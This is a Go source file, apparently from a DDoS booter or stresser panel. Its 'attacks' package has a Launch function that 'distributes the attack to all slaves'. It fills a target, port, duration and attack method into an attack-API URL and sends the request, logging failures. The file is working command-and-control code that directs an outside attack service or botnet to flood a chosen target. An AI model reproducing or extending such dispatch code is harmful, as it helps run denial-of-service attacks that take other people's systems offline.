package attacks

import (
	"errors"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

//Launch will build and distribute the attack to all slaves
func Launch(target string, duration int, port int, method *Attack) error {
	return launchAPI(target, port, duration, method)
}

func launchAPI(target string, duration int, port int, method *Attack) error {

	if len(method.API) == 0 {
		return errors.New("no api to send attack to")
	}

	attackURL := strings.Replace(method.API, "[target]", url.QueryEscape(target), -1)
	attackURL = strings.Replace(attackURL, "[port]", url.QueryEscape(strconv.Itoa(port)), -1)
	attackURL = strings.Replace(attackURL, "[duration]", url.QueryEscape(strconv.Itoa(duration)), -1)
	attackURL = strings.Replace(attackURL, "[method]", url.QueryEscape(method.Name), -1)

	client := http.Client{
		Timeout: time.Second * 80,
	}

	resp, err := client.Get(attackURL)
	if err != nil {
		log.Println("==== Failed to send attack")
		log.Println("Method:", method.Name)
		log.Println("Target:", target)
		log.Println("URL:", attackURL)
		log.Println("Err:", err)

		return errors.New("failed to send please check the terminal log")
	}

	if resp.StatusCode != 200 {
		log.Println("==== Failed to send attack")
		log.Println("Method:", method.Name)
		log.Println("Target:", target)
		log.Println("URL:", attackURL)
		log.Println("Status:", resp.StatusCode)

		body, _ := ioutil.ReadAll(resp.Body)

		log.Println("Body:", string(body))

		return errors.New("failed to send please check the terminal log")
	}
  
	return nil
}
